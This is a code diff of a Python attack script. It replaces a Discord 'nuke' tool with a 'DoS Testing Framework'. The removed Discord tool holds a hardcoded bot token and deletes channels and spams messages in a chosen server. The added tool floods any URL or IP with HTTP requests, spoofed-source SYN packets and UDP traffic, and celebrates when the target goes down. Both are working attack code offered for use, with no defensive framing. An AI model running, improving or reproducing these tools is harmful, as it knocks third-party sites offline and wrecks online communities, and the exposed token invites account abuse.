@@ -1,220 +1,375 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
-TRX NUKE — تحكم كامل بسيرفر ديسكورد
-تثبيت:  pip install aiohttp
-التشغيل: python trx.py
-"""
+DoS tester with independent self-monitoring.
 
-import asyncio
-import json
+  python3 main.py https://site.com
+  python3 main.py ip:1.2.3.4:443
+  python3 main.py https://site.com -w 300 -d 600
+"""
+from __future__ import annotations
+
+import os
 import random
+import socket
+import struct
+import sys
+import threading
+import time
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse
 
-import aiohttp
+import requests
+import urllib3
+from rich.align import Align
+from rich.console import Console
+from rich.layout import Layout
+from rich.live import Live
+from rich.panel import Panel
+from rich.table import Table
 
-# ================== الإعدادات ==================
-TOKEN   = "MTU0NTQ1MTUyNzEzNTY5OTAxNA.GcXI8-.WNYC_iq9IuwXSl6I1DyDPkAJNPYlH1AEtRzwA8"   # ← حط التوكن هنا
-IS_BOT  = True              # True =MTU0NTQ1MTUyNzEzNTY5OTAxNA.GcXI8-.WNYC_iq9IuwXSl6I1DyDPkAJNPYlH1AEtRzwA8    |   False =TRX جحفله#3949(self-bot)
-WORKERS = 8                 # عدد الطلبات المتزامنة (لا ترفعه كثير عشان الرايت ليمت)
-# ===============================================
+urllib3.disable_warnings()
+console = Console()
 
-API = "https://discord.com/api/v10"
+UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+]
 
-
-def auth_headers():
-    return {
-        "Authorization": f"Bot {TOKEN}" if IS_BOT else TOKEN,
-        "Content-Type": "application/json",
-    }
-
-
-async def api(session, method, path, payload=None, tries=6):
-    """طلب لأي endpoint ديسكورد مع تعامل مع 429 والرايت ليمت."""
-    url = API + path
-    last = None
-    for attempt in range(tries):
-        async with session.request(method, url, json=payload, headers=auth_headers()) as r:
-            status = r.status
-            body = await r.text()
-
-            if status == 429:                     # rate limited
-                try:
-                    wait = float(json.loads(body).get("retry_after", 1.0))
-                except Exception:
-                    wait = 1.0
-                await asyncio.sleep(wait + 0.25)
-                continue
-
-            if status >= 400:
-                last = f"{status} {body[:200]}"
-                await asyncio.sleep(0.4 * (attempt + 1))
-                continue
-
-            if not body:
-                return None
-            try:
-                return json.loads(body)
-            except json.JSONDecodeError:
-                return None
-
-    if last:
-        print(f"\n[!] فشل {method} {path} → {last}")
-    return None
+BANNER = r"""[bold red]
+▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒  [bright_yellow]╔══════════════════════════════╗[/]
+▒▒█▒▒▒▄██████████▄▒▒▒▒  [bright_yellow]║[/]    [bold cyan]DoS Testing Framework[/]     [bright_yellow]║[/]
+▒█▐▒▒▒████████████▒▒▒▒  [bright_yellow]║[/]   [bold red]Created by Bayy Xploit[/]     [bright_yellow]║[/]
+▒▌▐▒▒██▄▀██████▀▄██▒▒▒  [bright_yellow]╚══════════════════════════════╝[/]
+▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒  [bright_yellow][[/][bold green]TARGET[/][bright_yellow]][/] [bold white]URL or ip:HOST[:PORT][/]
+▐┼▐▒▒██████████████▒▒▒  [bright_yellow][[/][bold cyan]AUTO[/][bright_yellow]][/] [bold white]Monitors target, stops on kill[/]
+▐▄▐████─▀▐▐▀█─█─▌▐██▄▒  [bright_yellow][[/][bold red]STOP[/][bright_yellow]][/] [bold white]Ctrl+C[/]
+▒▒█████──────────▐███▌
+▒▒█▀▀██▄█─▄───▐─▄███▀▒
+▒▒█▒▒███████▄██████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒█████████▐▌██▌▒▒▒
+▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
+[/]"""
 
 
-def ask_int(prompt, default=1):
-    raw = input(prompt).strip()
-    if raw == "":
-        return default
+# ─────────────────────────────── state
+class State:
+    def __init__(self):
+        self.lock = threading.Lock()
+        self.sent = 0
+        self.ok = 0
+        self.err = 0
+        self.bytes = 0
+        self.start = time.time()
+        self.stop = threading.Event()
+        self.down = False
+        self.down_at = 0.0
+        self.baseline = None
+        self.lat = 0.0
+        self.fails = 0
+        self.probes = 0
+        self.probe_ok = 0
+
+
+# ─────────────────────────────── helpers
+def checksum(data: bytes) -> int:
+    if len(data) % 2:
+        data += b"\x00"
+    total = 0
+    for i in range(0, len(data), 2):
+        total += (data[i] << 8) + data[i + 1]
+    total = (total >> 16) + (total & 0xFFFF)
+    total += total >> 16
+    return ~total & 0xFFFF
+
+
+def random_ip() -> str:
+    while True:
+        a = random.randint(1, 223)
+        if a in (10, 127):
+            continue
+        b = random.randint(0, 255)
+        if a == 172 and 16 <= b <= 31:
+            continue
+        if a == 192 and b == 168:
+            continue
+        if a == 169 and b == 254:
+            continue
+        if a == 100 and 64 <= b <= 127:
+            continue
+        return f"{a}.{b}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+
+
+def fmt(n: int) -> str:
+    return f"{n:,}"
+
+
+# ─────────────────────────────── monitor
+def monitor(url: str, st: State, need: int = 3) -> None:
+    """Independent prober. Declares the target dead and stops the attack."""
+    while not st.stop.is_set():
+        t0 = time.time()
+        alive = False
+        try:
+            r = requests.get(
+                url, timeout=4, verify=False, allow_redirects=False,
+                headers={"User-Agent": random.choice(UAS),
+                         "Cache-Control": "no-cache", "Pragma": "no-cache"},
+            )
+            st.lat = time.time() - t0
+            alive = r.status_code < 500
+        except Exception:
+            st.lat = 0.0
+
+        with st.lock:
+            st.probes += 1
+            if alive:
+                st.probe_ok += 1
+                st.fails = 0
+                if st.baseline is None or st.lat < st.baseline:
+                    st.baseline = st.lat
+            else:
+                st.fails += 1
+
+        if (not st.down and st.fails >= need
+                and st.probes >= 6 and time.time() - st.start > 6):
+            st.down = True
+            st.down_at = time.time() - st.start
+            st.stop.set()
+            return
+
+        time.sleep(1.0)
+
+
+# ─────────────────────────────── http
+def http_worker(url: str, st: State, timeout: float) -> None:
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": random.choice(UAS),
+        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
+        "Accept-Encoding": "identity",
+        "Connection": "close",
+        "Cache-Control": "no-cache",
+    })
+    while not st.stop.is_set():
+        target = url + ("&" if "?" in url else "?") + "cb=" + str(random.randint(1, 10**9))
+        r = None
+        try:
+            r = s.get(target, timeout=timeout, verify=False,
+                      allow_redirects=False, stream=True)
+            n = len(r.content)
+            with st.lock:
+                st.sent += 1
+                st.bytes += n
+                if r.status_code < 500:
+                    st.ok += 1
+        except Exception:
+            with st.lock:
+                st.sent += 1
+                st.err += 1
+        finally:
+            if r is not None:
+                r.close()
+
+
+# ─────────────────────────────── raw
+def syn_worker(dst: str, port: int, st: State) -> None:
     try:
-        return max(0, int(raw))
-    except ValueError:
-        return default
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    except PermissionError:
+        return
+    dstb = socket.inet_aton(dst)
+    while not st.stop.is_set():
+        src = random_ip()
+        srcb = socket.inet_aton(src)
+        sport = random.randint(1024, 65535)
+        seq = random.randint(0, 2**32 - 1)
+        ihl = 0x45
+        hdr = struct.pack("!BBHHHBBH4s4s", ihl, 0, 40,
+                          random.randint(0, 65535), 0, 64,
+                          socket.IPPROTO_TCP, 0, srcb, dstb)
+        hdr = struct.pack("!BBHHHBBH4s4s", ihl, 0, 40, 0, 0, 64,
+                          socket.IPPROTO_TCP, checksum(hdr), srcb, dstb)
+        tcp = struct.pack("!HHIIBBHHH", sport, port, seq, 0, 0x50, 0x02, 8192, 0, 0)
+        pseudo = struct.pack("!4s4sBBH", srcb, dstb, 0, socket.IPPROTO_TCP, len(tcp))
+        tcp = struct.pack("!HHIIBBHHH", sport, port, seq, 0, 0x50, 0x02, 8192,
+                          checksum(pseudo + tcp), 0)
+        try:
+            sock.sendto(hdr + tcp, (dst, 0))
+            with st.lock:
+                st.sent += 1
+                st.bytes += 40
+        except OSError:
+            with st.lock:
+                st.err += 1
 
 
-# ----------------- اختيار السيرفر -----------------
-async def pick_guild(session):
-    guilds = await api(session, "GET", "/users/@me/guilds") or []
-    if not guilds:
-        print("[!] مافيه سيرفرات ظاهرة لهذا التوكن (تأكد إن البوت داخل السيرفر).")
-        return None
+def udp_worker(dst: str, port: int, st: State) -> None:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = os.urandom(1400)
+    while not st.stop.is_set():
+        try:
+            sock.sendto(payload, (dst, port))
+            with st.lock:
+                st.sent += 1
+                st.bytes += 1400
+        except OSError:
+            with st.lock:
+                st.err += 1
 
-    q = input("اكتب اسم السيرفر (أو ID): ").strip()
-    exact   = [g for g in guilds if g["id"] == q or g["name"].lower() == q.lower()]
-    partial = [g for g in guilds if g["id"] == q or q.lower() in g["name"].lower()]
-    pool = exact or partial
 
-    if not pool:
-        print("[!] مالقيت السيرفر. المتاح:")
-        for g in guilds:
-            print(f"    - {g['name']}  ({g['id']})")
-        return None
+# ─────────────────────────────── ui
+def render(st: State, url: str, mode: str) -> Layout:
+    el = max(time.time() - st.start, 0.001)
+    with st.lock:
+        sent, ok, err, nbytes = st.sent, st.ok, st.err, st.bytes
+        lat, base, fails, probes = st.lat, st.baseline, st.fails, st.probes
 
-    if len(pool) == 1:
-        return pool[0]
+    left = Table.grid(padding=1)
+    left.add_column(style="bright_yellow", justify="right")
+    left.add_column(style="bold white")
+    left.add_row("Target:", url)
+    left.add_row("Mode:", mode)
+    left.add_row("Requests:", fmt(sent))
+    left.add_row("OK:", f"[green]{fmt(ok)}[/]")
+    left.add_row("Errors:", f"[red]{fmt(err)}[/]")
+    left.add_row("RPS:", f"[cyan]{sent / el:.0f}[/]")
+    left.add_row("Mbps:", f"[cyan]{nbytes * 8 / el / 1_000_000:.2f}[/]")
+    left.add_row("Elapsed:", f"{el:.0f}s")
 
-    print("أكثر من سيرفر مطابق، اختر رقم:")
-    for i, g in enumerate(pool, 1):
-        print(f"  [{i}] {g['name']}  ({g['id']})")
+    right = Table.grid(padding=1)
+    right.add_column(style="bright_yellow", justify="right")
+    right.add_column(style="bold white")
+    right.add_row("Probes:", str(probes))
+    right.add_row("Reachable:", f"[green]{st.probe_ok}[/]")
+    right.add_row("Consec. fails:", f"[red]{fails}[/]")
+    right.add_row("Latency:", f"{lat:.2f}s" if lat else "-")
+    right.add_row("Baseline:", f"{base:.2f}s" if base else "measuring...")
+
+    if st.down:
+        verdict = "[bold red]DOWN[/]"
+        border = "red"
+    elif base and lat and lat > max(3.0, base * 6):
+        verdict = "[bold yellow]SLOWED[/]"
+        border = "yellow"
+    else:
+        verdict = "[bold green]ALIVE[/]"
+        border = "bright_yellow"
+    right.add_row("Verdict:", verdict)
+
+    layout = Layout()
+    layout.split_row(
+        Panel(left, title="[bold red]Attack[/]", border_style="bright_yellow", padding=(0, 1)),
+        Panel(right, title="[bold red]Probe[/]", border_style=border, padding=(0, 1)),
+    )
+    return layout
+
+
+# ─────────────────────────────── main
+def parse_target(raw: str):
+    raw = raw.strip()
+    if raw.lower().startswith("ip:"):
+        rest = raw[3:].strip()
+        port = 443
+        if ":" in rest:
+            host, p = rest.rsplit(":", 1)
+            host = host.strip()
+            port = int(p)
+        else:
+            host = rest
+        socket.inet_aton(host)
+        scheme = "https" if port in (443, 8443) else "http"
+        return "ip", host, port, f"{scheme}://{host}:{port}/"
+    if not raw.startswith(("http://", "https://")):
+        raw = "https://" + raw
+    u = urlparse(raw)
+    if not u.hostname:
+        raise ValueError("رابط غير صالح")
+    return "url", u.hostname, (u.port or (443 if u.scheme == "https" else 80)), raw
+
+
+def main() -> None:
+    os.system("cls" if os.name == "nt" else "clear")
+    console.print(Align.center(BANNER))
+
+    target = sys.argv[1] if len(sys.argv) > 1 else console.input(
+        "\n[bright_yellow][[/][bold white]TARGET[/][bright_yellow]][/] "
+        "[bold cyan]URL or ip:HOST[:PORT]:[/] ")
     try:
-        return pool[int(input("رقم: ").strip()) - 1]
-    except Exception:
-        return None
+        mode, host, port, probe_url = parse_target(target)
+    except Exception as exc:
+        console.print(f"[bold red]هدف غير صالح: {exc}[/]")
+        sys.exit(1)
 
+    duration = int(sys.argv[sys.argv.index("-d") + 1]) if "-d" in sys.argv else 600
+    http_w = int(sys.argv[sys.argv.index("-w") + 1]) if "-w" in sys.argv else 200
 
-# ----------------- العمليات -----------------
-async def rename_guild(session, gid):
-    new_name = input("الاسم الجديد للسيرفر: ").strip()
-    if not new_name:
-        print("[!] اسم فاضي، ملغي.")
-        return
-    res = await api(session, "PATCH", f"/guilds/{gid}", {"name": new_name})
-    print(f"[✓] تم تغيير اسم السيرفر إلى: {new_name}" if res else "[!] فشل التغيير (تحتاج صلاحية Manage Server).")
+    is_root = hasattr(os, "geteuid") and os.geteuid() == 0
+    st = State()
 
+    console.print(Panel(
+        f"[bold white]Target[/] : {probe_url}\n"
+        f"[bold white]Mode[/]   : {'IP (syn+udp+http)' if mode == 'ip' else 'HTTP flood'}\n"
+        f"[bold white]Limit[/]  : {duration}s\n"
+        f"[bold white]Root[/]   : {'yes' if is_root else 'no'}"
+        + ("" if is_root or mode == "url" else "\n[red]syn disabled — run with sudo[/]"),
+        title="[bold red]Configuration[/]", border_style="bright_yellow", padding=(0, 1)))
 
-async def get_channels(session, gid):
-    return await api(session, "GET", f"/guilds/{gid}/channels") or []
+    if mode == "ip" and not is_root:
+        console.print("[yellow]! بدون sudo: سيُشغّل udp+http فقط[/]")
 
+    threading.Thread(target=monitor, args=(probe_url, st), daemon=True).start()
+    threading.Thread(target=lambda: (time.sleep(duration), st.stop.set()), daemon=True).start()
 
-async def delete_channels(session, gid):
-    chans = await get_channels(session, gid)
-    total = len(chans)
-    n = ask_int(f"كم روم تحذف؟ (الموجود {total} — اكتب 0 أو Enter = الكل): ", default=0)
-    if n == 0 or n > total:
-        n = total
+    pool = ThreadPoolExecutor(max_workers=http_w + 80)
+    try:
+        with Live(render(st, probe_url, mode), console=console,
+                  refresh_per_second=4) as live:
+            for _ in range(http_w):
+                pool.submit(http_worker, probe_url, st, 3.0)
+            if mode == "ip":
+                if is_root:
+                    for _ in range(48):
+                        pool.submit(syn_worker, host, port, st)
+                for _ in range(8):
+                    pool.submit(udp_worker, host, port, st)
+            while not st.stop.is_set():
+                live.update(render(st, probe_url, mode))
+                time.sleep(0.25)
+            live.update(render(st, probe_url, mode))
+    except KeyboardInterrupt:
+        st.stop.set()
+    finally:
+        pool.shutdown(wait=False, cancel_futures=True)
 
-    random.shuffle(chans)
-    targets = chans[:n]
-    sem = asyncio.Semaphore(WORKERS)
-    done = 0
+    el = max(time.time() - st.start, 0.001)
+    console.print()
+    if st.down:
+        console.print(Panel(
+            Align.center(
+                "[bold red]الموقع تقفل بنجاح معك التراكسي 😈[/]\n\n"
+                f"[white]سقط بعد[/] [bold red]{st.down_at:.0f}s[/] "
+                f"[white]عند[/] [bold red]{fmt(st.sent)}[/] [white]طلب[/]"),
+            title="[bold red]KILL CONFIRMED[/]", border_style="red", padding=(1, 2)))
+    else:
+        console.print(Panel(
+            Align.center("[bold yellow]الموقع صمد — لم يسقط خلال المدة[/]\n"
+                         "[white]أضف -w أو شغّل من VPS[/]"),
+            title="[bold yellow]SURVIVED[/]", border_style="yellow", padding=(1, 2)))
 
-    async def kill(c):
-        nonlocal done
-        async with sem:
-            await api(session, "DELETE", f"/channels/{c['id']}")
-            done += 1
-            print(f"\r    حذف {done}/{len(targets)} روم ...", end="", flush=True)
-
-    await asyncio.gather(*(kill(c) for c in targets))
-    print(f"\n[✓] تم حذف {done} روم (المخفي والظاهر).")
-
-
-async def spam_create_and_message(session, gid):
-    ch_name  = input("اسم الروم: ").strip() or "trx"
-    ch_count = ask_int("كم روم تنشئ؟ ", default=5)
-    message  = input("نص الرسالة: ").strip() or "TRX"
-    msg_count = ask_int("كم رسالة في كل روم؟ ", default=5)
-
-    sem = asyncio.Semaphore(WORKERS)
-    created = 0
-
-    async def worker(i):
-        nonlocal created
-        async with sem:
-            ch = await api(session, "POST", f"/guilds/{gid}/channels",
-                           {"name": ch_name, "type": 0})
-        if not ch:
-            return
-        cid = ch["id"]
-        created += 1
-        print(f"\r    منشأة {created}/{ch_count} روم ...", end="", flush=True)
-
-        for _ in range(msg_count):
-            await api(session, "POST", f"/channels/{cid}/messages", {"content": message})
-
-    await asyncio.gather(*(worker(i) for i in range(ch_count)))
-    print(f"\n[✓] تم إنشاء {created} روم وإرسال {created * msg_count} رسالة.")
-
-
-# ----------------- البرنامج الرئيسي -----------------
-async def main():
-    if "ضع_" in TOKEN:
-        print("[!] حط التوكن في المتغير TOKEN فوق أول.")
-        return
-
-    timeout = aiohttp.ClientTimeout(total=60)
-    connector = aiohttp.TCPConnector(limit=WORKERS * 3)
-
-    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-        me = await api(session, "GET", "/users/@me")
-        if not me:
-            print("[!] التوكن غلط أو منتهي.")
-            return
-        print(f"[+] متصل كـ: {me.get('username')}#{me.get('discriminator', '0')}")
-
-        guild = await pick_guild(session)
-        if not guild:
-            return
-        gid = guild["id"]
-        print(f"[+] السيرفر: {guild['name']}  ({gid})")
-
-        if input("اكتب TRX للتأكيد: ").strip() != "TRX":
-            print("[!] تأكيد خاطئ، خروج.")
-            return
-
-        while True:
-            print("""
-=========================================
-  [1] تغيير اسم السيرفر
-  [2] حذف رومات (المخفي والظاهر)
-  [3] سبام إنشاء رومات + سبام رسائل
-  [0] خروج
-=========================================""")
-            choice = input("اختر: ").strip()
-
-            if choice == "1":
-                await rename_guild(session, gid)
-            elif choice == "2":
-                await delete_channels(session, gid)
-            elif choice == "3":
-                await spam_create_and_message(session, gid)
-            elif choice == "0":
-                print("[+] خلصنا.")
-                return
+    console.print(
+        f"[white]إجمالي:[/] {fmt(st.sent)} | [green]ناجح:[/] {fmt(st.ok)} | "
+        f"[red]أخطاء:[/] {fmt(st.err)} | [cyan]RPS:[/] {st.sent / el:.0f} | "
+        f"[cyan]Mbps:[/] {st.bytes * 8 / el / 1_000_000:.2f}\n")
 
 
 if __name__ == "__main__":
     try:
-        asyncio.run(main())
+        main()
     except KeyboardInterrupt:
-        print("\n[!] إيقاف يدوي.")
+        console.print("\n[yellow]أُوقف يدوياً[/]")
